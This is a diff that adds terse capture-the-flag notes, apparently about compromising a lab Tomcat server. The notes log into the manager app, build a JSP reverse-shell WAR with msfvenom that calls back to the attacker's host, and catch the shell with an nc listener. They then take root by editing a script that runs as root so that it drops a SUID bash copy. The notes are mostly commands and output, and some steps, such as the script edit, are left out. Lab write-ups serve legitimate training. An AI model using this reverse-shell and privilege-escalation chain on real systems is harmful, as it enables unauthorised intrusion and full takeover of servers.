@@ -1,0 +1,59 @@
+
+
+
+attempting to login at /manager/ and failing
+
+we are brought to /manager/html and see
+
+ For example, to add the manager-gui role to a user named tomcat with a password of s3cret, add the following to the config file listed above. 
+
+ 
+Upon logging in, we see we can upload a war file.
+
+┌──(root㉿kali)-[/home/kali]
+└─# msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.6.66.96 LPORT=4444 -f war -o shell.war
+
+navigate to 
+http://10.201.57.16:8080/shell/
+
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.6.66.96] from (UNKNOWN) [10.201.57.16] 36252
+
+
+tomcat@ubuntu:/$ cd /home/jack
+tomcat@ubuntu:/home/jack$ ls
+id.sh  test.txt  user.txt
+tomcat@ubuntu:/home/jack$ cat id.sh
+#!/bin/bash
+id > test.txt
+tomcat@ubuntu:/home/jack$ nano id.sh
+tomcat@ubuntu:/home/jack$ ls /tmp
+hsperfdata_tomcat  systemd-private-8500301583c14f4fa5a9fa98077c3be6-systemd-timesyncd.service-o8Fjy7  VMwareDnD
+tomcat@ubuntu:/home/jack$ ls /tmp
+hsperfdata_tomcat  systemd-private-8500301583c14f4fa5a9fa98077c3be6-systemd-timesyncd.service-o8Fjy7
+rootbash	   VMwareDnD
+tomcat@ubuntu:/home/jack$ cd /tmp
+tomcat@ubuntu:/tmp$ ./rootbash -p
+rootbash-4.3# id
+uid=1001(tomcat) gid=1001(tomcat) euid=0(root) groups=1001(tomcat)
+rootbash-4.3# whoami
+root
+rootbash-4.3# 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
